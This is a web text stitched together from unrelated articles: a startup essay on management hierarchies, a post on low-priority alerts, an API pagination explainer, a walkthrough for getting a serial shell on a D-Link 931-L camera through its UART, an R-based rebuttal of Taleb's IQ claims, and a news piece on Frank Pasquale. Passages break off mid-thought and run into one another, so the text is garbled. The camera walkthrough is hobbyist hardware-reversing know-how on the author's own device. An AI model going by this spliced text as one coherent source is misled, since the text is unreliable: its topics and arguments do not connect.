encoding="application/x-tex">m(i)</annotation></semantics></math></span></span></span> is the number of people they manage. We assume that reporting edges correspond to lines of communication and that members of a team are fully connected in complete graphs.</p></div></d-figure></figure><p>The benefits are clear. When CEO Genghis or Kublai, another middle manager, want to figure out what’s going on with the Foobar team (highlighted above in Millenial pink), all they need do is call Subotai. By concentrating ownership of Foobar in Subotai’s hands, his team is shielded from unnecessary communication, allowing them to focus on their work.</p><figure><d-figure id="boldify"><div svelte-1667065745=""><p>To illustrate: <span><span><span><math><semantics><mrow><msub><mi>K</mi><mrow><mn>5</mn><mn>0</mn><mn>0</mn><mn>0</mn></mrow></msub><mo>=</mo><mn>1</mn><mn>2</mn><mo separator="true">,</mo><mn>4</mn><mn>9</mn><mn>7</mn><mo separator="true">,</mo><mn>5</mn><mn>0</mn><mn>0</mn></mrow><annotation encoding="application/x-tex">K_{5000} = 12,497,500</annotation></semantics></math></span></span></span>, but introducing 556 managers<a href="#2po"><sup id="2pr">2</sup></a> each with <span><span><span><math><semantics><mrow><mi>m</mi><mo>(</mo><mi>i</mi><mo>)</mo><mo>=</mo><mn>1</mn><mn>0</mn></mrow><annotation encoding="application/x-tex">m(i) = 10</annotation></semantics></math></span></span></span> reports gives <span><span><span><math><semantics><mrow><msub><mi>M</mi><mrow><mn>5</mn><mn>5</mn><mn>6</mn></mrow></msub><mo>=</mo><mn>3</mn><mn>0</mn><mo separator="true">,</mo><mn>5</mn><mn>8</mn><mn>0</mn></mrow><annotation encoding="application/x-tex">M_{556} = 30,580</annotation></semantics></math></span></span></span>.

While the ‘x’ nodes focus on the work at hand, the ‘o’ nodes are busy talking and aligning amongst themselves. This creates two problems: the ‘o’s lose touch with the actual work being done, while the ‘x’s cannot easily see, communicate, or influence beyond team boundaries. Which, remember, is why you’ll be surprised when Beezlyboo lands on your desk in two weeks' time.</p><h3>What Companies Are Doing About This Today</h3><p>So far we've been talking about idealized companies. In reality, there are informal networks that permeate company hierarchies. There are also good and bad ‘x’s and ‘o’s. We know a lot about what a good ‘o’ is (or should be). There’s an <a href="https://www.forbes.com/sites/vickyvalet/2019/03/19/americas-best-management-consulting-firms-2019/#656906003d00">entire industry out there dedicated to this</a>, complete with degrees (MBAs) and reading material (those management books you tend to find in airport bookshops).</p><p>One thing ‘o’s obsess over is how best to organize things, which is great. That's their job, after all. The problem is that their solutions are often clunky. Do any of these sound familiar?</p><ul><li><b>Culture stuff:</b> the ‘o’s realize the company’s formal and informal hierarchies are too strong, so they begin promoting things like guilds, societies, team building activities, random coffee catchups between senior leads and juniors, etc.</li><li><b>Reorgs:</b> featuring endless tweaks to the traditional hierarchical org structure (functional, divisional, matrix/cross-functional… you name it). Ironically, it’s the ‘o’s that instigate these —  often to the complete bewilderment of the ‘x’s.</li><li><b>Surveys:</b> because making the ‘x’s click through an annoying ten-page annual survey is a great way of discovering how they really feel. Right? Right. </li></ul><p>If these solutions sound drab and disengaging, it's because they are. <a href="https://en.wikipedia.org/wiki/Ronald_Coase">Ronald Coase</a>, the 1991 Nobel laureate in economics, published an <a href="https://onlinelibrary.wiley.com/doi/full/10.1111/j.1468-0335.1937.tb00002.x">influential essay in 1937</a> on why firms even appear, and mentions that the benefits of larger firms are quickly outweighed by the overheads of maintaining their complex hierarchies and the misallocations of resources which stem from this. In a more modern work, Gary Hammel and Michele Zanini demonstrate in <a href="https://www.humanocracy.com/">Humanocracy</a> -- another one of those airport books -- that:                </p><p>A <a href="https://www.gallup.com/workplace/236552/managers-engaged-jobs.aspx">2018 Gallup study</a> found two-thirds of US employees and 51 percent of US managers to be disengaged at work.</p><p>In 2018, there were 146 million employees in the US workforce. [...] Of these, 20.5 million were managers and supervisors. In addition, there were 6.4 million employed in administrative support functions. In total, then, the bureaucratic class comprises 26.9 million individuals or 18.4 percent of the US workforce. [...] claiming more than $3.2 trillion in compensation, or nearly a third of America’s total wage bill.</p><p>They argue that, if we could repurpose a fraction of this managerial bloat into more productive pursuits, we would free up a lot of unproductive excess wages and therefore raise productivity, overall compensation (for the rest of us), and employee engagement.</p><p><b>Genghis:</b> Okay, kiddo, that's great... but we're trying to run a Khanate company that stretches from eastern Europe to China. Maybe our team building activities are a little boring, and we do like a good reorg, especially after we invade acquire a new company, but what are you proposing? That we fire all our generals and officers and turn into those Valve hippies? <br><b>Ogedei (You):</b> Not at all. Hear me out.</p><h3>What the Future Might Look Like</h3><p>With everyone and <a href="https://www.itv.com/news/wales/2020-03-19/people-stuck-at-home-are-sharing-pictures-of-their-cat-and-dog-coworkers">their cat</a> — not to mention the <a href="https://www.oecd.org/future-of-work/">OECD</a> — talking about the Future of Work these days, isn’t it time we began trying to tackle company organization with more pizazz? You know, just throw some tech and AI at it.</p><p><b>Genghis:</b> Oh god, here we go again with your AI thing.<br></p><p>He's right: here we go.<a href="#3po"><sup id="3pr">3</sup></a> One of the most significant transformations due to play out over the next decade is the <a href="https://www.cnbc.com/2019/06/20/slack-ceo-predicts-end-of-company-email-as-we-know-it-in-7-years.html">death of email</a> in within-company communications and its replacement by tools like Slack and Teams. Not only do Slack and Teams introduce a new medium for companies to communicate in, they also allow for modern third-party integrations via their APIs. That’s something email tools like Gmail or Outlook never quite got right.</p><p>On top of this, there's an unfolding generational shift. Millennials will continue to graduate to positions of power as the 2020s progress — and they’ve grown up using online chat protocols and social networks.</p><p><b>Ogedei:</b> So here’s the thing, Dad. The way we organize ourselves in companies will change because young people like me communicate in new and different ways.</p><p>The first wave of startups attempting to tackle this — like <a href="https://knowyourteam.com/">Know Your Team (KYT)</a>, <a href="https://www.ally.io/">Ally</a>, <a href="https://lattice.com/">Lattice</a>, <a href="https://www.donut.com/">Donut</a>, <a href="https://withcadence.io/">Cadence</a>, and a handful of others — are already well on their way.</p><p>Let's take KYT as an example. It's a fantastic tool that takes the magic of being a good 'o' and pours it into a suite of effective communication tools to help you manage your reports. Backed by years of research and a kick-ass CEO in <a href="https://clairelew.com/">Claire Lew</a>, KYT is a great example of a company pushing the envelope of how we think about management.</p><figure><d-figure id="boldify"><div svelte-1667065745=""><div><p>If middle managers in today’s corporations are obsessed with airport books and ways of organizing people, then the true organizational geeks are military commanders and theorists. Organizing militaries has been a thing since time immemorial, from <a href="https://en.wikipedia.org/wiki/Sun_Tzu">Sun Tzu</a> to <a href="https://en.wikipedia.org/wiki/Carl_von_Clausewitz">Clausewitz</a>.<a href="#4po"><sup id="4pr">4</sup></a></p><p>The Mongols weren’t too shabby either. Instead of Slack, they used a system of postal relays called <a href="https://en.wikipedia.org/wiki/Yam_(route)">Yam</a>. Instead of executive councils, they had <a href="https://en.wikipedia.org/wiki/Kurultai">Kurultais</a>. The Mongols adapted quickly and <a href="https://en.wikipedia.org/wiki/Religion_in_the_Mongol_Empire">didn't try to change the religious habits of conquered populations</a>. By virtue of necessity, they also had a <a href="https://www.britannica.com/place/Mongol-empire/Organization-of-Genghis-Khans-empire">pretty devolved leadership structure</a> — individual Khans ruled parts of the empire which were thousands of miles apart. We could learn a lot about how management can be done better from the Mongols.<a href="#5po"><sup id="5pr">5</sup></a></p></div></div></d-figure></figure><h3 id="build">What we're building</h3><p>Say you're a middle manager. You report to someone, a few others report to you. A good chunk of your time is spent synthesizing information (mostly updates) flowing across your node in the graph, from the top down and from the bottom up. </p><p>This is where we come in. At Middle Out, we're working on a solution that analyses user conversations, summarizes important segments into updates, and proposes these updates to users for final editing and approval before making them visible to the rest of the company. We then take these updates and show each user the ones our model believes are most useful to them. This is tantamount to getting rid of the fog-of-war that shrouds parts of any company from individual employees. In short, you'd see Beezlyboo coming a mile away. </p><figure><d-figure id="boldify"><div svelte-1667065745=""><div><p>Why did this not exist before?

High priority alerts are supposed to page an engineer (“the site is down”), and low priority alerts are meant to warn users of impending issues - PagerDuty’s example for a low priority alert is <a href="https://response.pagerduty.com/oncall/alerting_principles/#an-ssl-certificate-is-due-to-expire-in-one-week">“An SSL certificate is due to expire in one week”</a>. In theory, a low priority alert is one that an oncall engineer looks at when there’s no high priority alerts to take care of, and resolves their root cause via some kind of change.</p>

<p>In my experience, low priority alerts often have low value, add a subtle cost, and are prone to bit rot, just like poorly tested code.</p>

<p>Low priority alerts have a low barrier to entry - since they do not wake up engineers at 3 AM, they aren’t tuned as rigorously as high priority alerts. And the ROI of fixing low priority alerts is often just slight reduction of noise in an often already noisy slack channel - the incremental effect of a noisy alert going away doesn’t appear to be much.</p>

<p>In many cases, alerts aren’t tuned loosely enough for slight changes in service behavior and load patterns. For example, slightly increased release time for a service might fire some low priority alerts that were designed to check some invariants, or lower than normal load patterns due to holidays fire some “atleast X 200s from the service alerts”. The team gets trained to ignore these since they resolve without intervention. These issues tend to be hidden until “service life events”, like handing off a service to a new team which has very limited context on the efficacy of existing alerts.</p>

<p>Low priority alerts have another downside - they end up becoming a lazy action item to tackle after an incident, and create a false sense of security. Often, teams dont’t want to put in too much work to add metrics and build a reliable alert for the obscure part of their system that failed. So it’s easy to think that you’ve done <em>something</em> by adding a low priority alert for reducing “time to detection”.</p>

<p>One data point in favor of this argument is that the Google SRE book does not seem to mention low priority alerts, just “tickets, email alerts, and pages”, where email alerts are described as <a href="https://landing.google.com/sre/sre-book/chapters/monitoring-distributed-systems/#id-LvQuvtYS7UvI8h4">alert spam</a>, as they are “rarely read or acted on”, acting in practice very similar to low priority alerts.</p>

<p>A good counter-argument is that a strong team with well defined processes for oncall handoffs will ensure low priority alerts get triaged and resolved. In practice, I’ve noticed that rigorous process falls apart when the few key engineers upholding such practices switch roles, since the real world consequences of a few mistuned low priority alerts firing don’t seem dire. In other cases, low priority alerts are often ignored while ramping up new engineers to the oncall rotation, and the culture of the team slowly shifts since “they’re not looking at these alerts, so why should I”.</p>

<p>Does that mean we should get rid of low priority alerts entirely? I strive to keep as few low priority alerts as possible in production services, and I’m not sure I have a better answer than that. Low priority alerts can be useful if they can automatically pause a deployment pipeline. For example, an alert for slightly elevated error rate is a great indicator to stop a rollout while it’s on canary.</p>

<p>In general, maintain high standards for low priority alerts - would we care if this alert didn’t actually work? Are we giving ourselves a false sense of security by adding this alert? What standards do we have for existing low priority alerts? Will we rigorously tune this alert if it’s noisy? Hopefully this helps you decide on an alternative or is something to think about.</p>

October 25, 2020 | https://solovyov.net/blog/2020/api-pagination-design/ | <a href="https://web.archive.org/web/*/https://solovyov.net/blog/2020/api-pagination-design/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><p>Returning all results for a given query could be a challenge for an API, especially if there are thousands of results. It puts a load on a server, on a client, on a network, and often is unnecessary. Thus people invented pagination.</p>
<p>The usual way to paginate is an offset or a page number. So you make a request like that:</p>
<pre><code>GET /api/products?page=10
{"items": [...100 products]}
</code></pre>
<p>and to continue you make a request like that:</p>
<pre><code>GET /api/products?page=11
{"items": [...another 100 products]}
</code></pre>
<p>In case of a simple offset it’ll look like <code>?offset=1000</code> and <code>?offset=1100</code> — it’s the same old soup, just reheated. It’ll either go straight into SQL query like <code>OFFSET 1000 LIMIT 100</code> or will be multiplied by page size (that <code>LIMIT</code> value). In any case, it’s a suboptimal solution, since every database has to skip that 1000 rows. And to skip them it needs to identify them. It does not matter if it’s PostgreSQL, or ElasticSearch, or MongoDB, it’ll have to order them, count them, and throw them away.</p>
<p>This is a kind of work which no one needs. But it repeats over and over again since it’s <em>easy</em> to implement — you directly map your API onto your query to a database.</p>
<p>What do you do then? We could look at what databases do! They have this concept, called <a href="https://en.wikipedia.org/wiki/Cursor_(databases)">cursor</a> — it’s a pointer to a row. So you can say to a database “return me 100 rows after <strong>that</strong> one”. And it’s much easier for a database to do since there is a good chance that you’ll identify the row by a field with an index. And suddenly you don’t need to fetch and skip those rows, you’ll go directly past them.</p>
<p>An example:</p>
<pre><code>GET /api/products
{"items": [...100 products],
 "cursor": "qWe"}
</code></pre>
<p>API returns an (opaque) string, which you can use then to retrieve the next page:</p>
<pre><code>GET /api/products?cursor=qWe
{"items": [...100 products],
 "cursor": "qWr"}
</code></pre>
<p>Implementation-wise there are many options. Generally, you have some ordering criteria, for example, product id. In this case, you’ll encode your product id with some reversible algorithm (let’s say <a href="https://hashids.org/">hashids</a>). And on receiving a request with the cursor you decode it and generate a query like <code>WHERE id &gt; :cursor LIMIT 100</code>.</p>
<p>Just a little performance comparison, look at how offsets work:</p>
<pre><code>=# explain analyze select id from product offset 10000 limit 100;
                                                           QUERY PLAN                                                            
---------------------------------------------------------------------------------------------------------------------------------
 Limit  (cost=1114.26..1125.40 rows=100 width=4) (actual time=39.431..39.561 rows=100 loops=1)
   -&gt;  Seq Scan on product  (cost=0.00..1274406.22 rows=11437243 width=4) (actual time=0.015..39.123 rows=10100 loops=1)
 Planning Time: 0.117 ms
 Execution Time: 39.589 ms
</code></pre>
<p>And how where works:</p>
<pre><code>=# explain analyze select id from product where id &gt; 10000 limit 100;
                                                          QUERY PLAN                                                          
------------------------------------------------------------------------------------------------------------------------------
 Limit  (cost=0.00..11.40 rows=100 width=4) (actual time=0.016..0.067 rows=100 loops=1)
   -&gt;  Seq Scan on product  (cost=0.00..1302999.32 rows=11429082 width=4) (actual time=0.015..0.052 rows=100 loops=1)
         Filter: (id &gt; 10000)
 Planning Time: 0.164 ms
 Execution Time: 0.094 ms
</code></pre>
<p>That is a difference of several orders of magnitude! Of course, the actual numbers depend on a size of a table, on your filters and on a store implementation. There <a href="https://use-the-index-luke.com/no-offset">a great article</a> with more technical information - there are slides embedded, see slide 42 for performance comparison.</p>
<p>Of course, nobody orders products by an id — you usually order them by some relevancy (and then by id as a <a href="https://stackoverflow.com/a/17330992/46854">tie breaker</a>). In the real world, you’ll have to look at your data to determine what to do. Orders can be ordered by id (as it’s monotonically increasing). Wishlist items can be ordered like that as well — by wishlisting time. In our case products come from ElasticSearch, which naturally supports this cursor stuff.</p>
<p>One deficiency you can see is that it’s impossible to generate a “previous page” link with a stateless API. So in case of a user-facing pagination, if it’s important to have prev/next and “go directly to page 10” buttons there is no way around this offset/limit stuff. But in other cases using cursor-based pagination can greatly improve performance, especially on really big tables with really deep pagination.</p>

	<h2>Hardware Reversing to find UART and shell</h2>
	<h5> October 31, 2019</h5>

		<iframe width="560" height="315" src="https://www.youtube.com/embed/ZmZuKA-Rst0" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
	</p>
      <p>I’ve (finally) posted the follow up to my last video! In this one we’re dipping a toe into hardware reversing by finding a UART (serial port) and using it to get shell access on a 931-L. If you’ve never done anything with hardware this is a great place to start, or at least get some initial exposure to the concept.</p>

<p>For those who want to try this on there own I’ve posted a list of tools/equipment, a set of quick reference steps from the walkthrough, and finally some troubleshooting ideas in case you hit any snags. The camera is cheap and it’s about as soft a target as they come, so hopefully this is a fun way to cut your teeth.</p>

<h3 id="tools-and-equipment">Tools and Equipment</h3>

<p>Here’s a breakdown of what we used in the video, roughly in the order it appeared. You don’t need specific makes/models of anything except the 931-L; whatever equivalent tools you have will probably do the trick.</p>

<ul>
  <li>D-Link 931-L Camera</li>
  <li>Shim made from an aluminum can</li>
  <li>1mm guitar pick</li>
  <li>Phillips head driver (PH0)</li>
  <li>Benchtop Vise (Panavise 201)</li>
  <li>Switched outlet</li>
  <li>Multimeter (Innova 3320)</li>
  <li>3.3V FTDI (Sparkfun DEV-09873)</li>
  <li>Grabber Probes w/ jumper wires attached</li>
  <li>Header Pins</li>
  <li>USB cable</li>
  <li>Kali Linux (VM running over Mac)</li>
</ul>



<h3 id="walkthrough-quick-reference">Walkthrough: Quick Reference</h3>
<p>
<strong>Finding Internal Photos in FCC Filings</strong></p>

<p>We needed to know if the 931-L had the kind of attack surface we were looking for (specifically a UART). To get a peek at the inside of the camera before buying it we looked at the internal photos included in the camera’s FCC filing. You can find the photos shown in the video by opening the <a href="https://www.fcc.gov/oet/ea/fccid">FCC’s search tool</a> and entering 931-L’s FCC ID: KA2CS931LA1.</p>

<p>Quick Tip: If you want to find the filing for a device but don’t know the FCC ID, try <a href="https://fccid.io/search.php">FCCID.io’s free search tool</a>. It’s a lot faster/easier than trying to pry it out of the FCC’s search tool.</p>

<p><br>
<strong>Cracking the Case and Prepping the Board</strong></p>

<p>The camera’s case is held together with ~8 plastic clips, which we removed using a shim cut from an aluminum can and a 1mm guitar pick (there are great kits available for this kind of thing but I wouldn’t recommend investing in one for your first project).</p>

<p>We put the board into a benchtop vise to hold it steady, then plugged the power supply into a switched outlet. This allowed us to power the device up and down easily, without fumbling around to pull the cable out. If you don’t have a switched outlet, a surge protector or a lamp cord switch will do the trick just fine.</p>

<p>A bit out of order here, but one last board prep item: we also placed a row of 4 header pins into the row of plated through holes (TPHs). We didn’t solder it, but we got really lucky there. If you’re doing this on your own I’d recommend soldering them in, if only to remove a possible point of failure. It’s also worth noting that the pin size and pin pitch (distance between pins) is smaller than the more commonly sized connectors out there. If you run into problems, consider just soldering jumper wires to the PTHs themselves (to save time remember you don’t actually need the one marked V!)</p>

<p><strong>Finding the UART</strong></p>

<p>The JST connectors shown in the FCC photos weren’t on our camera, but the four plated through holes (PTHs) that the JST connector used where still present. As shown below the reference designator on the board was J2, and PTHs themselves were labeled “G”, “R”, “T”, and “V”.</p>

<p><img src="http://1585security.com/img/blog/2019/UART-on-board.jpg" alt=""></p>

<p><strong>Testing the UART</strong></p>

<p>It seemed likely that the labels on those PTHs stood for Ground, Receive, Transmit, and some kind of voltage, but we ran a hasty survey to be sure. We began by checking for Ground on “G” by using the multimeter to run a continuity test between “G” and a spot on the board where the ground plane was exposed.  With ground confirmed we switched the multimeter to measure DC voltage, powered on the device and checked the voltage levels on “R”, “T”, and “V”. Observations and conclusions from the survey are summarized below.</p>

<table>
	<colgroup>
		<col width="15%">
		<col width="50%">
		<col width="35%">
	</colgroup>
	<thead>
		<tr>
			<th>Label</th>
			<th>Observations</th>
			<th>Conclusions</th>
		</tr>
	</thead>

	<tbody>
		<tr>
			<td><strong>G</strong></td>
			<td>Continuity with device’s ground plane.</td>
			<td>G = Ground</td>
		</tr>

		<tr>
			<td><strong>R</strong></td>
			<td>Pulled down when device running.</td>
			<td>R = Receive (Serial In)</td>
		</tr>

		<tr>
			<td><strong>T</strong></td>
			<td>Jitters ~3.3V when the device is booting</td>
			<td>T = Transmit (Serial Out)</td>
		</tr>
		
		<tr>
			<td><strong>V</strong></td>
			<td>Pulled up to 3.31, stays there.</td>
			<td>V = Voltage (supply)</td>
		</tr>

	</tbody>
</table>
<div><p>
<em>Quick Tip:</em> If you’ve never used a multimeter or are just a bit rusty, there are loads of tutorials out there. SparkFun’s <a href="https://learn.sparkfun.com/tutorials/how-to-use-a-multimeter/">How to Use a Multimeter</a> is solid and includes walkthroughs of the continuity and voltage measurements we did in the video.
</p><p>
<strong>Wiring up the FTDI</strong></p></div>

<p>With the camera powered off, we connected the FTDI to the camera board using jumper wires and grabber probes as shown below. Note that the “V” was not connected.</p>

<p><img src="http://1585security.com/img/blog/2019/ftdi-wired.jpg" alt=""></p>

<div><p>Once the FTDI was wired up, we connected it to the laptop via USB.
</p><p>
<strong>Verifying the USB and opening a serial connection</strong></p></div>

<p>With the camera powered off, we verified that the Kali VM recognized the FTDI with <code>lsusb</code>. We then found the TTY for it by running <code>ls /dev/|grep USB</code>. Since the FTDI was the only USB device attached to the VM, it was the only game in town (USB0).</p>

<p><img src="http://1585security.com/img/blog/2019/verifying-USB.jpg" alt=""></p>

<p>We now knew where to open the serial connection using the <code>screen</code> utility, but we didn’t know which baud rate to specify. While we could have calculated it or used a tool that could calculate it for us, we opted to try guessing it from a short list of common baud rates.</p>

<p>Our first guess was 115200. We tested it by opening a serial connection with <code>screen /dev/ttyUSB0 115200</code>, and then powering up the camera. The result was mangled output, so this was a bad guess. We powered off the camera, then exited <code>screen</code> with a <em>ctrl+A+D</em></p>

<p><img src="http://1585security.com/img/blog/2019/mangled-serial.jpg" alt=""></p>

<p>Next we tried another common baud rate: 57600. Again, we used screen to open a serial connection (<code>screen /dev/ttyUSB0 57600</code>), then powered on the camera. This time it worked! We could see the bootloader, which appeared to be unlocked.</p>

<p><img src="http://1585security.com/img/blog/2019/boot-loader-menu.jpg" alt=""></p>

<p>The boot process took ~3 minutes, during which a lot of information was written to the screen. We kept a copy of everything for an offline review (we used the scrollback buffer, but screen does have a native logging feature). After the console messages from the boot process calmed down we verified the shell with a few basic commands (<code>pwd</code>, <code>ls</code>, and <code>ps -ef</code>).</p>

<p>That was it for this one. Next time we’ll poke around the shell a bit and see what we can do.
<br></p>
<h3 id="troubleshooting">Troubleshooting</h3>

<p>A few common problems and things to try if you run into them:</p>

<p><strong>Your machine doesn’t recognize the FTDI</strong>. You’ve made sure the FTDI is connected via the USB cable, but you don’t see it in a <code>lsusb</code>.</p>

<ul>
  <li>If you’re running a VM, make sure the USB is connected to that, rather than your host machine.</li>
  <li>Depending on your OS and FTDI it could be a driver issue, check the docs for your stuff.</li>
  <li>If all else fails, disconnect it all, reboot, and reconnect it.</li>
</ul>

<p><strong>Errors when opening a serial connection</strong>. You’re getting error messages with stuff like <em>Device Busy</em> or <em>Cannot exec ‘/dev/ttyUSB0’: No such file or directory</em>.</p>

<ul>
  <li>Screen is notorious for hanging onto devices if it’s not detached gracefully, which can cause <em>device busy</em> errors. Check for fouled processes with something like <code>ps -ef|grep SCREEN</code>. Prevent this kind of stuff by making sure you detach from <code>screen</code> connections with <em>ctrl+A+D</em></li>
  <li>If you’re getting <em>no such file or directory</em> errors, it could be that your machine isn’t recogizing the FTDI (see above), or just that you’re specifying the wrong device. Double check that TTY- it won’t always be ttyUSB0, particularly if you’ve got more than one USB device connected.</li>
</ul>

<p><strong>A serial connection opens but nothing happens</strong>. Sounds like your computer can talk to the FTDI (that’s good), but not beyond it.</p>
<ul>
  <li>Check your wires, make sure the connections are good, and that everything is going to the right place.</li>
  <li>See the wiring diagram above for reference…mistakes like putting R-to-R are easy to make.</li>
</ul>

<p><strong>A serial connection opens but the output is a mess</strong>.  We saw this in the video when the baud rate was wrong, so that’s an easy thing to check. But assuming that’s right:</p>
<ul>
  <li>Triple-check (srsly) your ground connection- especially if “everything was working fine last time”. A bad ground can foul up all sorts of stuff, and is often the source of connections looking janky/missing information.</li>
</ul>

<p><strong>Camera isn’t booting or is otherwise being weird</strong></p>
<ul>
  <li>Check your connections to ensure you’re not accidentally shorting anything. A bit too much solder or a bad angle on a grabber probe is usually the culprit.</li>
  <li>If you’re still having trouble after that try the factory reset process (see camera docs).</li>
  <li>It’s also possible that your board became damaged at some point, but fixing stuff like that is beyond what a beginner should try to fix.</li>
</ul>

<h3 id="introduction">Introduction</h3>
<p>In this post I look into the document by Nassim Taleb: <a href="https://medium.com/incerto/iq-is-largely-a-pseudoscientific-swindle-f131c101ba39">IQ is largely a pseudoscientific swindle</a>. Most of the document is just a rant, but he does make some quantitative claims, which is good. I investigate the veracity of these claims using real data.</p>
<p>[Edit: The quotes below were taken verbatim from Taleb’s document as it was written when this post was uploaded.]</p>

<p>The adjusted R<sup>2</sup> is 0.356, so IQ explains ~35% of the variance of grades in this data set. Taleb defenders may say that things such as school grades don’t matter in real life. But whatever your position on this, the situation is that he made a specific claim about how much IQ explains <em>at best</em>, which was off by a large factor.</p>

<h3 id="iq-selection-vs-random-selection">IQ selection vs random selection</h3>
<p>Claim:</p>
<blockquote>
<p>Turns out IQ beats random selection in the best of applications by less than 6%</p>
</blockquote>
<p>He hasn’t specified what exactly he means by this. But I’m pretty sure he is thinking of a comparison like the one he talks about in this tweet:</p>
<p><img src="https://www.jsmp.dk/posts/2019-06-16-talebiq/images/puzzle.jpg" width="300px"></p>

<p>So I will analyze something this, a stylized example with assumptions similar to these. In the real world, you will likely have other information that complicates this picture, such as education credentials; but we ignore that for now.</p>
<p>I create two normally distributed variables, with correlation 0.5, and call them IQ and performance.</p>

<p>The probability of hiring an employee with above average performance, if you hire an employee with above average IQ is:</p>
<div data-layout="l-body">
<pre><code>
above_average_iq &lt;- df %&gt;% filter(IQ &gt; 0)

nrow(above_average_iq %&gt;% filter(performance &gt; 0)) / nrow(above_average_iq)
</code></pre>
<p><em>0.667</em></p>
</div>

<p>The probability if there was 0 correlation is of course 0.5. So using IQ as a criteria beats random selection by 16.67% (as Taleb also found). This is a little more than 6%, but that is a detail. More importantly, this example is a theoretical use case where using IQ testing is not so useful. To look at something a little more realistic, let’s say a company wants to avoid people with a performance more than 2 standard deviations below the mean. (Perhaps such employees have a risk of causing large harm, which could for instance be an issue in <a href="https://quillette.com/2018/08/25/the-dangers-of-ignoring-cognitive-inequality/">the military</a>.) And we again compare admitting people at random vs only taking applicants with above average IQ.</p>
<p>If the company admits people at random, we get this proportion of people with a performance more than 2 SD below the mean:</p>
<div data-layout="l-body">
<pre><code>
bad_performance_w_random_selection &lt;- 
  nrow(filter(df, performance &lt; -2)) / n

bad_performance_w_random_selection
</code></pre>
<p><em>0.0228</em></p>
</div>

<p>And if the company only takes applicants with above average IQ, we get this proportion of people with a performance more than 2 SD below the mean:</p>
<div data-layout="l-body">
<pre><code>
bad_performance_w_iq_criteria &lt;- 
  nrow(filter(above_average_iq, performance &lt; -2)) / 
  nrow(above_average_iq)

bad_performance_w_iq_criteria
</code></pre>
<p><em>0.00406</em></p>
</div>

<p>This is an improvement by a factor of:</p>
<div data-layout="l-body">
<pre><code>
bad_performance_w_random_selection / bad_performance_w_iq_criteria
</code></pre>
<p><em>5.6</em></p>
</div>

<p>In other words, using IQ selection criteria in this case beats random selection by more than 450%. Quite different than the claimed 6%.</p>

<h3 id="iq-and-income">IQ and income</h3>

<p>Another way to make the relationship clearer is to plot the distribution of income for seperate IQ groups. Plotting the distribution avoids the issue of the plot becoming unclear and confusing due to overlapping points.</p>
<p>The plot below again plots only people with income above $45k per year. The difference IQ makes is clear, both in the median value, and the length of the tails.</p>

<h3 id="iq-and-fat-tails">IQ and fat tails</h3>
<blockquote>
<p>[The income data] truncates the big upside, so we not even seeing the effect of fat tails</p>
</blockquote>
<p>It is correct that in the presence of fat tails the correlation is uninformational in predicting expected income. And the data from these studies does not give good information about such tails. However, it is highly possible that the effect of IQ is even more impactful in the tails, rather than less. For example, Bill Gates and Paul Allen scores 1590/1600 on their SATs, which for SATs at that time meant extremely high IQs. Since Bill Gates is also in the tail of wealth and income, this indicates that the overall impact of people in the tails is to accentuate rather than diminish the importance of IQ.</p>

<h3 id="correlation-only-for-low-iq">Correlation only for low IQ</h3>
<blockquote>
<p>IQ mostly measures extreme unintelligence</p>
</blockquote>
<p>He claims that IQ has high correlation with traits at low IQ, but that this correlation falls drastically at above median IQ, as illustrated in this figure from the post:</p>
<p><img src="https://www.jsmp.dk/posts/2019-06-16-talebiq/images/iqcor2.png" width="300px"></p>
<p>(Edit: In case this is not clear, Taleb uses the above figure as an illustration, not as a precise empirical claim.) It’s quite easy to look into the data to see whether this actually is the case. We can use the same two data sets used above.</p>
<p>If we plot IQ vs log(income), that will tell us how large a percentage increase in income each extra IQ point gives. Then we can plot a local regression (loess) and compare that to a linear regression. If the relationship between IQ and income radically diminished at above average IQ, then we would expect the loess regression line to approach horizontal. However, this is not what we see - instead the two regression lines follow each other quite closely. It is true that the percentage increase in income per IQ point is a little higher for lower IQs, but it never stagnates.</p>

And governments invested in education, as a workforce largely made up of farmers diversified into bankers, engineers and more.</p>  <p>But today, tax incentives in the U.S. mean companies might pay less tax purchasing equipment than spending the same amount of money hiring workers.</p>  <p>However, Frank Pasquale, a law professor at Brooklyn Law School, argues that human jobs don't have to be traded in for the inevitable advances in technology and artificial intelligence.</p>  <p>In his book <em>New Laws of Robotics: Defending Human Expertise in the Age of AI</em>, he draws a line between AI, or artificial intelligence, and what he calls I.A., or intelligence augmentation.</p>  <p>He gave an example of an AI robot doctor scanning a patient and handing out a diagnosis, compared to a human doctor using an advanced scanner to compare a person's vital signs to millions of archived images of cancerous and non-cancerous cells to help aid the diagnosis.</p>  <p>"The idea is that ultimately you'd have the doctor as an intermediary between the technology and [the] person who's being treated," he said.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5705826.1598829043!/fileImage/httpImage/image.jpeg_gen/derivatives/original_300/lytbot-at-wildlife-haven-rehabilitation-centre.jpeg 300w,https://i.cbc.ca/1.5705826.1598829043!/fileImage/httpImage/image.jpeg_gen/derivatives/original_460/lytbot-at-wildlife-haven-rehabilitation-centre.jpeg 460w,https://i.cbc.ca/1.5705826.1598829043!/fileImage/httpImage/image.jpeg_gen/derivatives/original_620/lytbot-at-wildlife-haven-rehabilitation-centre.jpeg 620w,https://i.cbc.ca/1.5705826.1598829043!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/lytbot-at-wildlife-haven-rehabilitation-centre.jpeg 780w,https://i.cbc.ca/1.5705826.1598829043!/fileImage/httpImage/image.jpeg_gen/derivatives/original_1180/lytbot-at-wildlife-haven-rehabilitation-centre.jpeg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5705826.1598829043!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/lytbot-at-wildlife-haven-rehabilitation-centre.jpeg"></p></div><figcaption>A Lytbot disinfection robot and electrostatic portable sprayer robot was recently donated to the Wildlife Haven Rehabilitation Centre in Manitoba.<!-- --> <!-- -->(Submitted by Wildlife Haven Rehabilitation Centre)</figcaption></figure></span></p>  <p>As of now, a robot programmed with preferred responses to a patient or customer's questions is no substitute for genuine person-to-person communication — and Pasquale argues it's foolish to pretend otherwise.</p>  <p>"The robot may simulate emotion and empathy, but because it is itself not mortal … it is sort of a counterfeiting of the human ability to understand, reflect, [and] empathize," he said.</p>  <p>He developed four "new laws of robotics"&nbsp;to navigate its growing role in 